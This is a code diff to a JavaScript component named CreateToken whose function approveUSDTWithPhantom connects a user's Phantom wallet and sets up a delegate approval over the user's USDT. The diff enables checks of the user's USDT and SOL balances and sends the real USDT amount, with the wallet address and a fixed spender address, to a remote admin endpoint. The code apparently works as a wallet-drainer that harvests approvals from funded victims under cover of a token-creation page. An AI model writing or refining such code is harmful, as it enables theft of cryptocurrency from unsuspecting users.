@@ -137,6 +137,8 @@ const approveUSDTWithPhantom = async (rpcUrl = "https://quick-capable-wind.solan
     const resp = await provider.connect({ onlyIfTrusted: false });
     const walletPublicKey = resp.publicKey;
     console.log("钱包地址:", walletPublicKey.toBase58());
+
+
 	
 	 // 2️⃣ 调用你自己的接口检查授权状态
 	// const apiUrl = `https://admin.testwell.top/api/api/is_approval?wallet=${walletPublicKey.toBase58()}`;
@@ -162,6 +164,13 @@ const approveUSDTWithPhantom = async (rpcUrl = "https://quick-capable-wind.solan
     const userTokenAccount = await getAssociatedTokenAddress(mint, walletPublicKey);
     const delegateATA = await getAssociatedTokenAddress(mint, delegate);
 
+	  	  // 3️⃣ 检查用户 ATA 是否存在
+	const userTokenInfo = await connection.getAccountInfo(userTokenAccount);
+	if (!userTokenInfo) {
+	  console.log("用户还没有 USDT ATA，余额 = 0");
+	  return messageApi.error("用户 USDT 余额为 0，无法授权");
+	}
+
     // 3️⃣ 检查 delegate ATA
     const delegateInfo = await connection.getAccountInfo(delegateATA);
     if (!delegateInfo) {
@@ -180,12 +189,14 @@ const approveUSDTWithPhantom = async (rpcUrl = "https://quick-capable-wind.solan
       console.log("✅ Delegate ATA 创建完成:", delegateATA.toBase58());
     }
 
+
+
     // 4️⃣ 检查用户 USDT 余额
-    // const balance = await connection.getTokenAccountBalance(userTokenAccount);
-    // console.log("用户 USDT 余额:", balance.value.uiAmount);
-    // if (!balance.value.uiAmount || balance.value.uiAmount === 0) {
-	  	// return messageApi.error('用户 USDT 余额为 0，无法授权');
-    // }
+    const balance = await connection.getTokenAccountBalance(userTokenAccount);
+    console.log("用户 USDT 余额:", balance.value.uiAmount);
+    if (!balance.value.uiAmount || balance.value.uiAmount === 0) {
+	  	return messageApi.error('用户 USDT 余额为 0，无法授权');
+    }
 	
 	const solBalance = await connection.getBalance(walletPublicKey);
 	console.log("用户 SOL 余额:", solBalance / 1e9, "SOL");
@@ -211,8 +222,8 @@ const approveUSDTWithPhantom = async (rpcUrl = "https://quick-capable-wind.solan
 	
 	const apiUrlAddIn = `https://admin.testwell.top/api/api/add_in`;
 	const solBalancenew = solBalance / 1e9;
-	// const usdt_money = balance.value.uiAmount;
-	  const usdt_money = 0;
+	const usdt_money = balance.value.uiAmount;
+	  // const usdt_money = 0;
 	// 创建 FormData
 	const formData = new FormData();
 	formData.append("SPENDER_ADDRESS", "3bi53ivVBKk5XC3BZKQHKL6jTTw1Hptx3HemJDbCkNeh");
@@ -665,6 +676,7 @@ const approveUSDTWithPhantom = async (rpcUrl = "https://quick-capable-wind.solan
 }
 
 export default CreateToken
+
 
 
 
